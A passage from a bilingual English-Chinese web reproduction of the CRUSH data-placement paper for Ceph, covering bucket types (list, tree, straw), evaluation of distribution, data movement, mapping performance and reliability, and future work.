placement question into that of “most recently added item, or older items?” This is a natural and intuitive choice for an expanding cluster: either an object is relocated to the newest device with some appropriate probability, or it remains on the older devices as before. The result is optimal data migration when items are added to the bucket. Items removed from the middle or tail of the list, however, can result in a significant amount of unnecessary movement, making list buckets most suitable for circumstances in which they never (or very rarely) shrink.</p><p>列表桶将其内容构建为链表，并且可以包含具有任意权重的项目。为了放置副本，CRUSH 从列表头部开始，包含最新添加的项目，并将其权重与所有剩余项目的权重之和进行比较。根据 hash(x, r, item) 的值，要么以适当的概率选择当前项目，要么该过程继续递归地沿着列表向下进行。这种方法源自 RUSHp，将放置问题重新定义为“最近添加的”问题。“是新项目，还是旧项目？”对于不断扩展的集群来说，这是一个自然而直观的选择：要么以适当的概率将对象迁移到最新的设备，要么像以前一样保留在旧设备上。当项目添加到存储桶时，其结果是最佳的数据迁移。然而，从列表中间或尾部移除项目可能会导致大量不必要的移动，因此列表存储桶最适合于从不（或很少）收缩的情况。</p><p>The RUSHp algorithm is approximately equivalent to a two-level CRUSH hierarchy consisting of a single list bucket containing many uniform buckets. Its fixed cluster representation precludes the use for placement rules or CRUSH failure domains for controlling data placement for enhanced reliability.</p><p>RUSHp 算法大致相当于一个两级 CRUSH 层次结构，由一个包含多个统一存储桶的列表存储桶组成。其固定的集群表示形式排除了使用放置规则或 CRUSH 故障域来控制数据放置以增强可靠性的可能性。</p><h3 id="3-4-3、Tree-Buckets"><a href="#3-4-3、Tree-Buckets" class="headerlink" title="3.4.3、Tree Buckets"></a>3.4.3、Tree Buckets</h3><p>Like any linked list data structure, list buckets are efficient for small sets of items but may not be appropriate for large sets, where their O(n) running time may be excessive. Tree buckets, derived from RUSHt , address this problem by storing their items in a binary tree. This reduces the placement time to O(logn), making them suitable for managing much larger sets of devices or nested buckets. RUSHt is equivalent to a two-level CRUSH hierarchy consisting of a single tree bucket containing many uniform buckets.</p><p>与任何链表数据结构一样，列表桶对于较小的项目集非常高效，但对于较大的项目集可能不太适用，因为其 O(n) 运行时间可能过长。源自 RUSHt 的树形桶通过将其项目存储在二叉树中解决了这个问题。这将放置时间缩短至 O(log n)，使其适合管理更大的设备集或嵌套桶。RUSHt 相当于一个两级 CRUSH 层次结构，由一个包含多个均匀分布桶的树形桶组成。</p><p>Tree buckets are structured as a weighted binary search tree with items at the leaves. Each interior node knows the total weight of its left and right subtrees and is labeled according to a fixed strategy (described below). In order to select an item within a bucket, CRUSH starts at the root of the tree and calculates the hash of the input key x, replica number r, the bucket identifier, and the label at the current tree node (initially the root). The result is compared to the weight ratio of the left and right subtrees to decide which child node to visit next. This process is repeated until a leaf node is reached, at which point the associated item in the bucket is chosen. Only logn hashes and node comparisons are needed to locate an item.</p><p>树形存储桶的结构为带权二叉搜索树，其项目位于叶子节点。每个内部节点都知道其左右子树的总权重，并根据固定策略进行标记（详见下文）。为了在存储桶中选择一个项目，CRUSH 从树的根节点开始，计算输入键 x、副本数量 r、存储桶标识符以及当前树节点（最初为根节点）的标签的哈希值。将结果与左右子树的权重比进行比较，以决定接下来要访问哪个子节点。此过程重复进行，直到到达叶子节点，此时存储桶中的相关项目将被选中。只需进行 log n 次哈希运算和节点比较即可定位项目。</p><p>The bucket’s binary tree nodes are labeled with binary values using a simple, fixed strategy designed to avoid label changes when the tree grows or shrinks. The leftmost leaf in the tree is always labeled “1.” Each time the tree is expanded, the old root becomes the new root’s left child, and the new root node is labeled with the old root’s label shifted one bit to the left (1, 10, 100, etc.). The labels for the right side of the tree mirror those on the left side except with a “1” prepended to each value. A labeled binary tree with six leaves is shown in Figure 4. This strategy ensures that as new items are added to (or removed from) the bucket and the tree grows (or shrinks), the path taken through the binary tree for any existing leaf item only changes by adding (or removing) additional nodes at the root, at the beginning of the placement decision tree. Once an object is placed in a particular subtree, its final mapping will depend only on the weights and node labels within that subtree and will not change as long as that subtree’s items remain fixed. Although the hierarchical decision tree introduces some additional data migration between nested items, this strategy keeps movement to a reasonable level, while offering efficient mapping even for very large buckets.</p><p>存储桶的二叉树节点采用简单的固定策略标记二进制值，以避免在树增长或收缩时标签发生变化。树中最左边的叶子节点始终标记为“1”。每次树扩展时，旧根节点都会成为新根节点的左子节点，并且树中最左边的叶子节点始终带有标签，新的根节点的标签将旧根节点的标签向左移动一位（例如 1、10、100 等）。树右侧的标签与左侧的标签相同，只是每个值前面都添加了一个“1”。图 4 显示了一棵有六片叶子的带标签二叉树。此策略确保，当新项目添加到（或从）存储桶中，并且树增长（或收缩）时，任何现有叶子项目在二叉树中的路径只会通过在放置决策树的起始位置的根节点处添加（或删除）其他节点而改变。一旦对象被放置在特定的子树中，其最终映射将仅取决于该子树中的权重和节点标签，并且只要该子树的项目保持不变，映射就不会改变。尽管分层决策树在嵌套项目之间引入了一些额外的数据迁移，但此策略将移动保持在合理水平，同时即使对于非常大的存储桶也能提供高效的映射。</p><div><p><img src="/assets/images/crush-figure-4.png" alt="Figure 4: Node labeling strategy used for the binary tree comprising each tree bucket." loading="lazy"></p></div><h3 id="3-4-4、Straw-Buckets"><a href="#3-4-4、Straw-Buckets" class="headerlink" title="3.4.4、Straw Buckets"></a>3.4.4、Straw Buckets</h3><p>List and tree buckets are structured such that a limited number of hash values need to be calculated and compared to weights in order to select a bucket item. In doing so, they divide and conquer in a way that either gives certain items precedence (e. g., those at the beginning of a list) or obviates the need to consider entire subtrees of items at all. That improves the performance of the replica placement process, but can also introduce suboptimal reorganization behavior when the contents of a bucket change due an addition, removal, or re-weighting of an item.</p><p>列表桶和树形桶的结构使得只需计算有限数量的哈希值并将其与权重进行比较，即可选择桶中的项目。在这样做的过程中，它们会采用分治法，要么优先考虑某些项目（例如，位于列表开头的项目），要么完全无需考虑项目的整个子树。这可以提高副本放置过程的性能，但当桶的内容由于项目的添加、移除或重新调整权重而发生变化时，也可能导致重组行为不理想。</p><p>The straw bucket type allows all items to fairly “compete” against each other for replica placement through a process analogous to a draw of straws. To place a replica, a straw of random length is drawn for each item in the bucket. The item with the longest straw wins. The length of each straw is initially a value in a fixed range, based on a hash of the CRUSH input x, replica number r, and bucket item i. Each straw length is scaled by a factor f(wi) based on the item’s weight3 so that heavily weighted items are more likely to win the draw, i. e. c(r,x) &#x3D; maxi(f(wi)hash(x,r,i)). Although this process is almost twice as slow (on average) than a list bucket and even slower than a tree bucket (which scales logarithmically), straw buckets result in optimal data movement between nested items when modified.</p><p>Straw 桶​​式让所有物品都能公平“竞争”。通过类似于抽签的过程，每个桶中的项目都会相互竞争以放置副本。要放置副本，需要为桶中的每个项目抽取一根随机长度的吸管。吸管最长的项目获胜。每根吸管的长度最初都是一个固定范围内的值，基于 CRUSH 输入 x、副本数量 r 和桶中项目 i 的哈希值。每根吸管的长度都会根据项目的权重乘以因子 f(w)，这样权重较大的项目更有可能获胜，即 c(r, x) &#x3D; max( f(w)hash(x, r, i))。虽然此过程（平均而言）几乎比列表桶慢两倍，甚至比树桶（以对数方式缩放）更慢，但吸管桶在修改嵌套项目时可实现最佳数据移动。</p><p>The choice of bucket type can be guided based on expected cluster growth patterns to trade mapping function computation for data movement efficiency where it is appropriate to do so. When buckets are expected to be fixed (e. g., a shelf of identical disks), uniform buckets are fastest. If a bucket is only expected to expand, list buckets provide optimal data movement when new items are added at the head of the list. This allows CRUSH to divert exactly as much data to the new device as is appropriate, without any shuffle between other bucket items. The downside is O(n) mapping speed and extra data movement when older items are removed or reweighted. In circumstances where removal is expected and reorganization efficiency is critical (e. g., near the root of the storage hierarchy), straw buckets provide optimal migration behavior between subtrees. Tree buckets are an all around compromise, providing excellent performance and decent reorganization efficiency.</p><p>可以根据预期的集群增长模式来选择桶类型，在合适的情况下，以映射函数计算量换取数据移动效率。当桶预计大小固定（例如，一排相同的磁盘）时，均匀桶速度最快。如果桶预计只会扩展，则列表桶会在列表头部添加新项目时提供最佳的数据移动效果。这使得 CRUSH 能够精确地转移数据会以适当的方式迁移到新设备，而不会在其他 bucket 项之间进行任何混洗。缺点是映射速度为 O(n)，并且在移除或重新加权旧项时会产生额外的数据移动。在预期移除操作且重组效率至关重要的情况下（例如，靠近存储层次结构的根节点），straw bucket 提供了最佳的子树间迁移行为。Tree bucket 则是一种全面的折衷方案，提供了出色的性能和不错的重组效率。</p><h1 id="4、评估"><a href="#4、评估" class="headerlink" title="4、评估"></a>4、评估</h1><p>CRUSH is based on a wide variety of design goals including a balanced, weighted distribution among heterogeneous storage devices, minimal data movement due to the addition or removal of storage (including individual disk failures), improved system reliability through the separation of replicas across failure domains, and a flexible cluster description and rule system for describing available storage and distributing data. We evaluate each of these behaviors under expected CRUSH configurations relative to RUSHp and RUSHt style clusters by simulating the allocation of objects to devices and examining the resulting distribution. RUSHp and RUSHt are generalized by a two-level CRUSH hierarchy with a single list or tree bucket (respectively) containing many uniform buckets. Although RUSH’s fixed cluster representation precludes the use of placement rules or the separation of replicas across failure domains (which CRUSH uses to improve data safety), we consider its performance and data migration behavior.</p><p>CRUSH 基于多种设计目标，包括在异构存储设备之间实现均衡的加权分布，最小化由于添加或移除存储（包括单个磁盘故障）而导致的数据移动，通过跨故障域分离副本来提高系统可靠性，以及用于描述可用存储和分发数据的灵活的集群描述和规则系统。我们通过模拟对象到设备的分配并检查最终的分布情况，评估了预期 CRUSH 配置下相对于 RUSHp 和 RUSHt 风格集群的上述每一种行为。RUSHp 和 RUSHt 都由两级 CRUSH 层次结构概括，分别包含一个包含许多均匀分布的桶的列表桶和树形桶。尽管 RUSH 的固定集群表示形式排除了使用放置规则或跨故障域分离副本（CRUSH 使用这两个规则来提高数据安全性），但我们仍考虑了其性能和数据迁移行为。</p><h2 id="4-1、数据分布"><a href="#4-1、数据分布" class="headerlink" title="4.1、数据分布"></a>4.1、数据分布</h2><p>CRUSH’s data distribution should appear random uncorrelated to object identifiers x or storage targets—and result in a balanced distribution across devices with equal weight. We empirically measured the distribution of objects across devices contained in a variety of bucket types and compared the variance in device utilization to the binomial probability distribution, the theoretical behavior we would expect from a perfectly uniform random process. When distributing n objects with probability pi &#x3D; wi W of placing each object on a given device i, the expected device utilization predicted by the corresponding binomial b(n, p) is µ &#x3D; np with a standard deviation of σ &#x3D; p np(1− p). In a large system with many devices, we can approximate 1− p ≃ 1 such that the standard deviation is σ ≃ √ µ—that is, utilizations are most even when the number of data objects is large.4 As expected, we found that the CRUSH distribution consistently matched the mean and variance of a binomial for both homogeneous clusters and clusters with mixed device weights.</p><p>CRUSH 的数据分布应该是随机的——与对象标识符 x 或存储目标无关——并最终在各设备上实现均衡的、权重相等的分布。我们根据经验测量了各种存储桶类型中对象在各设备上的分布情况，并将设备利用率的方差与二项概率分布（即我们预期的完全均匀随机过程的理论行为）进行了比较。当以 p&#x3D; 的概率将 n 个对象分布到给定设备 i 上时，相应的二项式 b(n, p) 预测的预期设备利用率为 μ &#x3D; np，标准差为 σ &#x3D; √ np(1 − p)。在包含许多设备的大型系统中，我们可以近似 1 − p ≃ 1，使得标准差为σ ≃ μ——即当数据对象数量很大时，利用率最均匀。正如预期的那样，我们发现 CRUSH 分布对于同构集群和具有混合设备权重的集群始终与二项式的平均值和方差相匹配。</p><h3 id="4-1-1、过载保护"><a href="#4-1-1、过载保护" class="headerlink" title="4.1.1、过载保护"></a>4.1.1、过载保护</h3><p>Although CRUSH achieves good balancing (a low variance in device utilization) for large numbers of objects, as in any stochastic process this translates into a non-zero probability that the allocation on any particular device will be significantly larger than the mean. Unlike existing probabilistic mapping algorithms (including RUSH), CRUSH includes a per-device overload correction mechanism that can redistribute any fraction of a device’s data. This can be used to scale back a device’s allocation proportional to its overutilization when it is in danger of overfilling, selectively “leveling off” overfilled devices. When distributing data over a 1000-device cluster at 99% capacity, we found that CRUSH mapping execution times increase by less than 20% despite overload adjustments on 47% of the devices, and that the variance decreased by a factor of four (as expected).</p><p>尽管 CRUSH 能够针对大量对象实现良好的平衡（设备利用率的方差较小），但与任何随机过程一样，这意味着任何特定设备上的分配量远大于平均值的概率并非为零。与现有的概率映射算法（包括 RUSH）不同，CRUSH 包含一个针对每台设备的过载校正机制，该机制可以重新分配设备的任何部分数据。当设备面临过载风险时，该机制可用于根据设备的过度利用率按比例缩减分配量，从而有选择地“平衡”过载的设备。当在容量利用率为 99% 的 1000 台设备集群上分配数据时，我们发现，尽管对 47% 的设备进行了过载调整，但 CRUSH 映射执行时间增加的幅度不到 20%，方差也降低了四倍（符合预期）。</p><h3 id="4-1-2、差异和部分失效"><a href="#4-1-2、差异和部分失效" class="headerlink" title="4.1.2、差异和部分失效"></a>4.1.2、差异和部分失效</h3><p>Prior research [Santos et al. 2000] has shown that randomized data distribution offers real-world system performance comparable to (but slightly slower than) that of careful data striping. In our own performance tests of CRUSH as part of a distributed object-based storage system [?], we found that randomizing object placement resulted in an approximately 5% penalty in write performance due to variance in the OSD workloads, related in turn to the level of variation in OSD utilizations. In practice, however, such variance is primarily only relevant for homogeneous workloads (usually writes) where a careful striping strategy is effective. More often, workloads are mixed and already appear random when they reach the disk (or at least uncorrelated to on-disk layout), resulting in a similar variance in device workloads and performance (despite careful layout), and similarly reduced aggregate throughput. We find that CRUSH’s lack of metadata and robust distribution in the face of any potential workload far outweigh the small performance penalty under a small set of workloads.</p><p>先前的研究 [Santos et al. 2000] 表明，随机数据分布在实际系统中的性能与谨慎的数据条带化相当（但略慢）。在我们自己对 CRUSH 作为分布式对象存储系统 [?] 的一部分进行的性能测试中，我们发现，由于 OSD 负载的差异，随机化对象放置会导致写入性能损失约 5%，这与 OSD 利用率的差异程度相关。然而，在实践中，这种差异主要只与同构负载（通常是写入）相关，在这种情况下，谨慎的条带化策略是有效的。更常见的情况是，负载是混合的，并且在到达磁盘时就已经呈现出随机性（或者至少与磁盘上的布局无关），导致设备负载和性能出现类似的差异（尽管布局谨慎），并且总吞吐量也同样降低。我们发现，CRUSH 在任何潜在负载下都缺乏元数据和稳健的分布，这远远超过了在少量负载下性能损失的益处。</p><p>This analysis assumes that device capabilities are more or less static over time. Experience with real systems suggests, however, that performance in distributed storage systems is often dragged down by a small number of slow, overloaded, fragmented, or otherwise poorly performing devices. Traditional, explicit allocation schemes can manually avoid such problem devices, while hash-like distribution functions typically cannot. CRUSH allows degenerate devices to be treated as a “partial failure” using the existing overload correction mechanism, diverting an appropriate amount of data and workload to avoiding such performance bottlenecks and correct workload imbalance over time.</p><p>此分析假设设备功能随时间变化基本保持不变。然而，实际系统经验表明，分布式存储系统的性能通常会被少数速度慢、过载、碎片化或其他性能不佳的设备拖累。传统的显式分配方案可以手动避开此类问题设备，而类似哈希的分配函数通常无法做到这一点。CRUSH 允许使用现有的过载校正机制将退化设备视为“部分故障”，从而转移适量的数据和工作负载，以避免此类性能瓶颈，并纠正随时间推移的工作负载不平衡。</p><p>Fine-grained load balancing by the storage system can further mitigate device workload variance by distributing the read workload over data replicas, as demonstrated by the DSPTF algorithm [Lumb et al. 2004]; such approaches, although complementary, fall outside the scope of the CRUSH mapping function and this paper.</p><p>存储系统进行的细粒度负载平衡可以通过在数据副本上分配读取工作负载来进一步缓解设备工作负载差异，正如 DSPTF 算法 [Lumb et al. 2004] 所证明的那样；此类方法虽然互补，但不在 CRUSH 的范围内。映射函数和本文。</p><h2 id="4-2、重组和数据移动"><a href="#4-2、重组和数据移动" class="headerlink" title="4.2、重组和数据移动"></a>4.2、重组和数据移动</h2><p>We evaluate the data movement caused by the addition or removal of storage when using both CRUSH and RUSH on a cluster of 7290 devices. The CRUSH clusters are four levels deep: nine rows of nine cabinets of nine shelves of ten storage devices, for a total of 7290 devices. RUSHt and RUSHp are equivalent to a two-level CRUSH map consisting of a single tree or list bucket (respectively) containing 729 uniform buckets with 10 devices each. The results are compared to the theoretically optimal amount of movement moptimal &#x3D; ∆w W , where ∆w is the combined weight of the storage devices added or removed and W is the total weight of the system. Doubling system capacity, for instance, would require exactly half of the existing data to move to new devices under an optimal reorganization.</p><p>我们评估在 7290 台设备集群上同时使用 CRUSH 和 RUSH 时，添加或移除存储所导致的数据移动。CRUSH 集群有四级深度：九排九个机柜，每排九个机架，每排十个存储设备，总共 7290 台设备。RUSHt 和 RUSHp 相当于一个两级 CRUSH 图，分别由一棵树或列表桶组成，包含 729 个均匀分布的桶，每个桶有 10 台设备。将结果与理论上的最佳移动量 moptimal &#x3D; 进行比较，其中 ∆w 是添加或移除的存储设备的总权重，W 是系统的总权重。例如，将系统容量翻倍将需要根据最佳重组方案将一半的现有数据移动到新设备。</p><p>Figure 5 shows the relative reorganization efficiency in terms of the movement factor mactual&#x2F;moptimal, where 1 represents an optimal number of objects moved and larger values mean additional movement. The X axis is the number of OSDs added or removed and the Y axis is the movement factor plotted on a log scale. In all cases, larger weight changes (relative to the total system) result in a more efficient reorganization. RUSHp (a single, large list bucket) dominated the extremes, with the least movement (optimal) for additions and most movement for removals (at a heavy performance penalty, see Section 4.3 below). A CRUSH multi-level hierarchy of list (for additions only) or straw buckets had the next least movement. CRUSH with tree buckets was slightly less efficient, but did almost 25% better than plain RUSHt (due to the slightly imbalanced 9-item binary trees in each tree bucket). Removals from a CRUSH hierarchy built with list buckets did poorly, as expected (see Section 3.3).</p><p>图 5 显示了以移动因子 m&#x2F;m 表示的相对重组效率，其中 1 表示移动对象的最佳数量，值越大表示移动量越大。X 轴表示添加或移除的 OSD 数量，Y 轴表示以对数刻度绘制的移动因子。在所有情况下，权重变化越大（相对于整个系统而言），重组效率越高。RUSHp（单个大型列表桶）在极端情况下表现最佳，添加操作的移动量最少（最优），而移除操作的移动量最多（性能损失严重，参见下文 4.3 节）。CRUSH 多级层级结构（仅用于添加操作）或 Straw 桶的移动量次之。使用树形桶的 CRUSH 效率略低，但比普通 RUSHt 的性能高出近 25%（原因是每个树形桶中的 9 项二叉树略微不平衡）。使用列表桶构建的 CRUSH 层级结构的移除操作性能不佳，正如预期的那样（参见 3.3 节）。</p><div><p><img src="/assets/images/crush-figure-5.png" alt="Figure 5: Efficiency of reorganization after adding or removing storage devices two levels deep into a four level, 7290 device CRUSH cluster hierarchy, versus RUSHp and RUSHt . 1 is optimal." loading="lazy"></p></div><p>Figure 6 shows the reorganization efficiency of different bucket types (in isolation) when nested items are added or removed. The movement factor in a modified tree bucket is bounded by logn, the depth of its binary tree. Adding items to straw and list buckets is approximately optimal. Uniform bucket modifications result in a total reshuffle of data. Modifications to the tail of a list (e. g., removal of the oldest storage) similarly induce data movement proportional to the bucket size. Despite certain limitations, list buckets may be appropriate in places within an overall storage hierarchy where removals are rare and at a scale where the performance impact will be minimal. A hybrid approach combining uniform, list, tree, and straw buckets can minimize data movement under the most common reorganization scenarios while still maintaining good mapping performance.</p><p>图 6 展示了当添加或删除嵌套项时，不同 bucket 类型（单独）的重组效率已移除。修改后的树形桶中的移动因子受其二叉树深度 log n 的限制。向秸秆桶和列表桶中添加项目近似为最优选择。均匀桶的修改会导致数据的彻底重组。修改列表的尾部（例如，移除最旧的存储）同样会引起与桶大小成比例的数据移动。尽管存在某些限制，但列表桶可能适用于整体存储层次结构中很少发生移除操作且性能影响最小的地方。结合均匀桶、列表桶、树形桶和秸秆桶的混合方法可以在最常见的重组场景下最大限度地减少数据移动，同时仍保持良好的映射性能。</p><div><p><img src="/assets/images/crush-figure-6.png" alt="Figure 6: Efficiency of reorganization after adding items to different bucket types. 1 is optimal. Straw and list buckets are normally optimal, although removing items from the tail of a list bucket induces worst case behavior. Tree bucket changes are bounded by the logarithm of thebucket size." loading="lazy"></p></div><h2 id="4-3、算法性能"><a href="#4-3、算法性能" class="headerlink" title="4.3、算法性能"></a>4.3、算法性能</h2><p>Calculating a CRUSH mapping is designed to be fast O(logn) for a cluster with n OSDs—so that devices can quickly locate any object or reevaluate the proper storage targets for the objects that they already store after a cluster map change. We examine CRUSH’s performance relative to RUSHp and RUSHt over a million mappings into clusters of different sizes. Figure 7 shows the average time (in microseconds) to map a set of replicas into a CRUSH cluster composed entirely of 8-item tree and uniform buckets (the depth of the hierarchy is varied) versus RUSH’s fixed twolevel hierarchy. The X axis is the number of devices in the system, and is plotted on a log scale such that it corresponds to the depth of the storage hierarchy. CRUSH performance is logarithmic with respect to the number of devices. RUSHt edges out CRUSH with tree buckets due to slightly simpler code complexity, followed closely by list and straw buckets. RUSHp scales linearly in this test (taking more than 25 times longer than CRUSH for 32768 devices), although in practical situations where the size of newly deployed disks increases exponentially over time one can expect slightly improved sub-linear scaling [Honicky and Miller 2004]. These tests were conducted with a 2.8 GHz Pentium 4, with overall mapping times in the tens of microseconds.</p><p>CRUSH 映射的计算速度被设计得非常快——对于包含 n 个 OSD 的集群，其复杂度为 O(log n)——这样设备就可以快速定位任何对象，或者在集群映射更改后重新评估已存储对象的正确存储目标。我们比较了 CRUSH 与 RUSHp&#x2F;RUSHt 的性能，对比了超过一百万次映射到不同规模集群的映射。图 7 显示了将一组副本映射到完全由 8 项树形和均匀存储桶（层级深度可变）组成的 CRUSH 集群的平均时间（以微秒为单位），以及 RUSH 固定的两级层级结构。X 轴表示系统中的设备数量，并以对数刻度绘制，使其与存储层级的深度相对应。CRUSH 的性能与设备数量呈对数关系。由于代码复杂度略低，RUSHt 凭借树形存储桶的优势略胜一筹，其次是 list 和 straw 存储桶。RUSHp 在本测试中呈线性增长（耗时超过 25 。对于 32768 个设备，这比 CRUSH 要长 1 倍（虽然在实际情况下，新部署的磁盘大小会随时间呈指数增长，但可以预期亚线性扩展会略有改善 [Honicky and Miller 2004]）。这些测试是在 2.8 GHz Pentium 4 上进行的，总体映射时间在几十微秒内。</p><div><p><img src="/assets/images/crush-figure-7.png" alt="Figure 7: CRUSH and RUSHt computation times scale logarithmically relative to hierarchy size, while RUSHp scales linearly." loading="lazy"></p></div><p>The efficiency of CRUSH depends upon the depth of the storage hierarchy and on the types of buckets from which it is built. Figure 8 compares the time (Y) required for c(r,x) to select a single replica from each bucket type as a function of the size of the bucket (X). At a high level, CRUSH scales as O(logn)—linearly with the hierarchy depth—provided individual buckets that may be O(n) (list and straw buckets scale linearly) do not exceed a fixed maximum size. When and where individual bucket types should be used depends on the expected number of additions, removals, or re-weightings. List buckets offer a slight performance advantage over straw buckets, although when removals are possible one can expect excessive data shuffling. Tree buckets are a good choice for very large or commonly modified buckets, with decent computation and reorganization costs.</p><p>CRUSH 的效率取决于存储层级的深度以及构建它的桶的类型。图 8 比较了 c(r, x) 从每种桶类型中选择单个副本所需的时间 (Y) 与桶大小 (X) 的关系。从高层次来看，CRUSH 的扩展速度为 O(log n)——与层级深度呈线性关系——前提是单个桶（可能是 O(n) 的桶，列表桶和 Straw 桶呈线性扩展）不超过固定的最大大小。何时何地使用单个桶类型取决于预期的添加、删除或重新加权次数。列表桶的性能略优于 Straw 桶，但当可以进行删除操作时，可以进一步避免过度的数据混排。对于非常大或经常修改的桶，树形桶是一个不错的选择，具有合理的计算和重组成本。</p><div><p><img src="/assets/images/crush-figure-8.png" alt="Figure 8: Low-level speed of mapping replicas into individual CRUSH buckets versus bucket size. Uniform buckets take constant time, tree buckets take logarithmic time, and list and straw buckets take linear time." loading="lazy"></p></div><p>Central to CRUSH’s performance—both the execution time and the quality of the results—is the integer hash function used. Pseudo-random values are calculated using a multiple input integer hash function based on Jenkin’s 32-bit hash mix [Jenkins 1997]. In its present form, approximately 45% of the time spent in the CRUSH mapping function is spent hashing values, making the hash key to both overall speed and distribution quality and a ripe target for optimization.</p><p>CRUSH 性能（包括执行时间和结果质量）的核心在于其所使用的整数哈希函数。伪随机值是使用基于 Jenkin 32 位哈希混合算法的多输入整数哈希函数计算得出的 [Jenkins 1997]。目前，CRUSH 映射函数中大约 45% 的时间用于哈希值计算，这使得哈希值成为整体速度和分发质量的关键，也是优化的成熟目标。</p><h3 id="4-3-1、疏忽老龄化"><a href="#4-3-1、疏忽老龄化" class="headerlink" title="4.3.1、疏忽老龄化"></a>4.3.1、疏忽老龄化</h3><p>CRUSH leaves failed devices in place in the storage hierarchy both because failure is typically a temporary condition (failed disks are usually replaced) and because it avoids inefficient data reorganization. If a storage system ages in neglect, the number of devices that are failed but not replaced may become significant. Although CRUSH will redistribute data to non-failed devices, it does so at a small performance penalty due to a higher probability of backtracking in the placement algorithm. We evaluated the mapping speed for a 1,000 device cluster while varying the percentage of devices marked as failed. For the relatively extreme failure scenario in which half of all devices are dead, the mapping calculation time increases by 71%. (Such a situation would likely be overshadowed by heavily degraded I&#x2F;O performance as each devices’ workload doubles.)</p><p>CRUSH 将故障设备保留在存储层级结构中，一方面是因为故障通常只是暂时现象（故障磁盘通常会被替换），另一方面是因为它避免了低效的数据重组。如果存储系统老化且无人照管，发生故障但未被替换的设备数量可能会变得非常庞大。虽然 CRUSH 会将数据重新分配到未发生故障的设备上，但由于布局算法中回溯的概率较高，因此会略微降低性能。我们评估了一个包含 1,000 个设备的集群的映射速度，同时改变了标记为故障的设备百分比。在相对极端的故障场景下，即一半设备都已失效，映射计算时间会增加 71%。（这种情况可能会被 I&#x2F;O 性能的严重下降所掩盖，因为每个设备的工作负载都会翻倍。）</p><h2 id="4-4、可靠性"><a href="#4-4、可靠性" class="headerlink" title="4.4、可靠性"></a>4.4、可靠性</h2><p>Data safety is of critical importance in large storage systems, where the large number of devices makes hardware failure the rule rather than the exception. Randomized distribution strategies like CRUSH that decluster replication are of particular interest because they expand the number of peers with which any given device shares data. This has two competing and (generally speaking) opposing effects. First, recovery after a failure can proceed in parallel because smaller bits of replicated data are spread across a larger set of peers, reducing recovery times and shrinking the window of vulnerability to additional failures. Second, a larger peer group means an increased probability of a coincident second failure losing shared data. With 2-way mirroring these two factors cancel each other out, while overall data safety with more than two replicas increases with declustering [Xin et al. 2004].</p><p>在大型存储系统中，数据安全至关重要。由于设备数量众多，硬件故障成为常态而非例外。像 CRUSH 这样能够去集群复制的随机分布策略尤其值得关注，因为它们可以扩展任何给定设备与其共享数据的对等节点数量。这会产生两种相互竞争且（一般而言）相反的效果。首先，故障后的恢复可以并行进行，因为较小的复制数据位分散在更大的对等节点集合中，从而缩短了恢复时间并缩小了对其他故障的脆弱性窗口。其次，更大的对等节点组意味着同时发生第二次故障并丢失共享数据的概率增加。在双向镜像中，这两个因素相互抵消，而使用去集群技术，拥有两个以上副本的整体数据安全性会提高 [Xin et al. 2004]。</p><p>However, a critical issue with multiple failures is that, in general, one cannot expect them to be independent—in many cases a single event like a power failure or a physical disturbance will affect multiple devices, and the larger peer groups associated with declustered replication greatly increase the risk of data loss. CRUSH’s separation of replicas across user-defined failure domains (which does not exist with RUSH or existing hash-based schemes) is specifi cally designed to prevent concurrent, correlated failuresfrom causing data loss. Although it is clear that the risk is reduced, it is difficult to quantify the magnitude of the improvement in overall system reliability in the absence of a specific storage cluster configuration and associated historical failure data to study. Although we hope to perform such a study in the future, it is beyond the scope of this paper.</p><p>然而，多重故障的一个关键问题是，一般来说，人们不能指望它们是独立的——在许多情况下，像电源故障或物理干扰这样的单一事件就会影响多个设备，而与非集群复制相关的更大的对等组会大大增加数据丢失的风险 CRUSH 将副本分离到用户定义的故障域（RUSH 或现有的基于哈希的方案均不存在此功能），其设计初衷是防止并发关联故障导致数据丢失。虽然风险明显降低，但在缺乏特定存储集群配置和相关历史故障数据可供研究的情况下，很难量化整体系统可靠性的提升幅度。虽然我们希望在未来开展此类研究，但这超出了本文的讨论范围。</p><h1 id="5、未来工作"><a href="#5、未来工作" class="headerlink" title="5、未来工作"></a>5、未来工作</h1><p>CRUSH is being developed as part of Ceph, a multi-petabyte distributed file system [?]. Current research includes an intelligent and reliable distributed object store based largely on the unique features of CRUSH. The primitive rule structure currently used by CRUSH is just complex enough to support the data distribution policies we currently envision. Some systems will have specific needs that can be met with a more powerful rule structure.</p><p>CRUSH 是 Ceph（一个多 PB 级分布式文件系统 [?]）的一部分，目前正在开发中。目前的研究包括一个智能可靠的分布式对象存储，主要基于 CRUSH 的独特功能。CRUSH 目前使用的原始规则结构复杂度刚好足以支持我们目前设想的数据分布策略。某些系统会有特定的需求，可以通过更强大的规则结构来满足。</p><p>Although data safety concerns related to coincident failures were the primary motivation for designing CRUSH, study of real system failures is needed to determine their character and frequency before Markov or other quantitative models can used to evaluate their precise effect on a system’s mean time to data loss (MTTDL).</p><p>尽管与同时发生的故障相关的数据安全问题是设计 CRUSH 的主要动机，但在使用马尔可夫或其他定量模型来评估它们对系统平均数据丢失时间 (MTTDL) 的精确影响之前，需要研究真实的系统故障以确定其特征和频率。</p><p>CRUSH’s performance is highly dependent on a suitably strong multi-input integer hash function. Because it simultaneously affects both algorithmic correctness—the quality of the resulting distribution—and speed, investigation into faster hashing techniques that are sufficiently strong for CRUSH is warranted.</p><p>CRUSH 的性能高度依赖于足够强大的多输入整数哈希函数。由于它同时影响算法的正确性（最终分布的质量）和速度，因此有必要研究能够满足 CRUSH 要求的更快、更强大的哈希技术。</p><h1 id="6、结论"><a href="#6、结论" class="headerlink" title="6、结论"></a>6、结论</h1><p>Distributed storage systems present a distinct set of scalability challenges for data placement. CRUSH meets these challenges by casting data placement as a pseudo-random mapping function, eliminating the conventional need for allocation metadata and instead distributing data based on a weighted hierarchy describing available storage. The structure of the cluster map hierarchy can reflect the underlying physical organization and infrastructure of an installation, such as the composition of storage devices into shelves, cabinets, and rows in a data center, enabling custom placement rules that define a broad class of policies to separate object replicas into different user-defined failure domains (with, say, independent power and network infrastructure). In doing so, CRUSH can mitigate the vulnerability to correlated device failures typical of existing pseudo-random systems with declustered replication. CRUSH also addresses the risk of device overfilling inherent in stochastic approaches by selectively diverting data from overfilled devices, with minimal computational cost.</p><p>分布式存储系统在数据放置方面面临着一系列独特的可扩展性挑战。CRUSH 